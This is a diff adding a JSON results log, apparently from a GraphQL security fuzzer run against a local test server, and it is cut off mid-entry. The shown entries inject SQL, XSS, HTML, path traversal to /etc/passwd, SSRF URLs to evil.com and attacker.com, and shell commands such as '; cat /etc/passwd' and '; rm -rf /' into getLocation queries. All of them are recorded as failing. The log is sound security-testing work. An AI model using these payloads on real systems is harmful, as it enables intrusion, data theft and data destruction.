@@ -1,0 +1,4104 @@
+[
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"12345\") {\n    id\n    name\n    lat\n    lng\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.014,
+    "timestamp": "2025-10-05T16:43:47.092802Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"12345' OR '1'='1\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:43:49.249054Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"12345<script>alert('XSS')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:43:51.938836Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"http://evil.com/payload\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:43:53.700727Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"12345; cat /etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:43:56.076032Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:43:57.711921Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"12345<h1>HTML Injection</h1>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:44:00.591384Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"67890\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.009,
+        "timestamp": "2025-10-05T16:44:02.536481Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-05T16:44:02.543517Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Syntax Error: Expected \"{\", found \":\".",
+              "locations": [
+                {
+                  "line": 2,
+                  "column": 8
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_PARSE_FAILED",
+                "exception": {
+                  "stacktrace": [
+                    "GraphQLError: Syntax Error: Expected \"{\", found \":\".",
+                    "    at syntaxError (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/error/syntaxError.js:15:10)",
+                    "    at Parser.expectToken (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1423:40)",
+                    "    at Parser.many (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1533:10)",
+                    "    at Parser.parseSelectionSet (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:265:24)",
+                    "    at Parser.parseOperationDefinition (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:193:26)",
+                    "    at Parser.parseDefinition (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:131:23)",
+                    "    at Parser.many (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1537:26)",
+                    "    at Parser.parseDocument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:109:25)",
+                    "    at Object.parse (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:36:17)",
+                    "    at parse (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:208:34)"
+                  ]
+                }
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-05T16:44:02.543599Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.01,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery a: getLocation {\n  getLocation(locationID: \"67890\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T16:44:04.912599Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T16:44:04.918976Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Syntax Error: Expected \"{\", found \":\".",
+              "locations": [
+                {
+                  "line": 2,
+                  "column": 8
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_PARSE_FAILED",
+                "exception": {
+                  "stacktrace": [
+                    "GraphQLError: Syntax Error: Expected \"{\", found \":\".",
+                    "    at syntaxError (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/error/syntaxError.js:15:10)",
+                    "    at Parser.expectToken (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1423:40)",
+                    "    at Parser.many (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1533:10)",
+                    "    at Parser.parseSelectionSet (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:265:24)",
+                    "    at Parser.parseOperationDefinition (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:193:26)",
+                    "    at Parser.parseDefinition (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:131:23)",
+                    "    at Parser.many (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1537:26)",
+                    "    at Parser.parseDocument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:109:25)",
+                    "    at Object.parse (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:36:17)",
+                    "    at parse (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:208:34)"
+                  ]
+                }
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-10-05T16:44:04.919033Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.007,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  getLocation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:44:06.930750Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Location\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Location\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"99999\") {\n    id\n    naame\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:44:08.779763Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"naame\" on type \"Location\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"naame\" on type \"Location\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "unknown"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:44:14.024003Z",
+    "count": 12,
+    "vulnerability_type": "unknown",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"1' OR '1'='1\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:44:16.426404Z",
+    "count": 13,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<script>alert('xss')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:44:18.428093Z",
+    "count": 14,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"http://attacker.com/steal-data\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:44:21.111228Z",
+    "count": 15,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"; rm -rf /; echo \") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:44:23.988035Z",
+    "count": 16,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"../../../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:44:25.846176Z",
+    "count": 17,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<h1>Malicious Title</h1><img src='x' onerror='alert(\\\"XSS\\\")'>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:44:28.422080Z",
+    "count": 18,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getLocation(locationID: \"loc-abc-123\") {\n    id\n    name\n    lat\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.01,
+        "timestamp": "2025-10-05T16:44:31.257106Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-05T16:44:31.264853Z",
+        "response_body": {
+          "data": {
+            "locationAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 19,
+    "timestamp": "2025-10-05T16:44:31.264913Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.009,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  locationAlias: getLocation(locationID: \"loc-abc-123\") {\n    id\n    name\n    lat\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T16:44:33.830726Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:44:33.835653Z",
+        "response_body": {
+          "data": {
+            "locationAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 20,
+    "timestamp": "2025-10-05T16:44:33.835678Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.005,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  getLocation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.004,
+    "timestamp": "2025-10-05T16:44:35.527116Z",
+    "count": 21,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Location\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Location\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101\") {\n    id\n    naame\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:44:37.996049Z",
+    "count": 22,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"naame\" on type \"Location\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"naame\" on type \"Location\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
